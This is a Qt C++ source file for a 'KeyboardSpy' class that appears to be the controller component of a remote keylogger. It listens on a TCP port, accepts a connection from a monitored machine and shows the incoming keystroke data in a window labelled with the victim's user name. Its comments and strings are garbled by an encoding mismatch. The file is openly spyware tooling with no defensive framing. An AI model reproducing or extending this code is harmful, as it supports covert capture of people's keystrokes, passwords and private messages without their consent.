#include "keyboardspy.h"

KeyboardSpy::KeyboardSpy(QWidget* parent) : QWidget(parent)
{
    // ��ʼ������
    const int w = 400, h = 300;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);

    // �����ı���
    mEdit = new QTextEdit(this);
    mEdit->setGeometry(0, 0, w, h);
    mEdit->setReadOnly(true);
}

int KeyboardSpy::startKeyboardSpyServer(QString userName)
{
    // ���ô��ڱ���
    this->setWindowTitle(userName.append("-���̼��"));

    // �����µķ����
    mServer = new TcpServer(this);
    connect(mServer, SIGNAL(newConnection(QTcpSocket*)), this, SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "������Ļ��ط����ʧ��";
        deleteLater();
        return -1;
    }

    // ������ش���
    this->show();

    return mServer->server()->serverPort();
}

void KeyboardSpy::newConnection(QTcpSocket* s)
{
    // �����ͻ�
    mSock = new TcpSocket(s, this);
    connect(mSock, SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // ���ټ����¿ͻ�
    mServer->server()->close();
}

void KeyboardSpy::processBuffer()
{
    // �����ݴ�ӡ���ı���
    QString text = mEdit->toPlainText();
    mEdit->setText(text.append(*mSock->buffer()));

    // ��ջ�����
    mSock->buffer()->clear();
}

void KeyboardSpy::resizeEvent(QResizeEvent*)
{
    mEdit->setGeometry(0, 0, width(), height());
}

void KeyboardSpy::closeEvent(QCloseEvent*)
{
    // ɾ������
    deleteLater();
}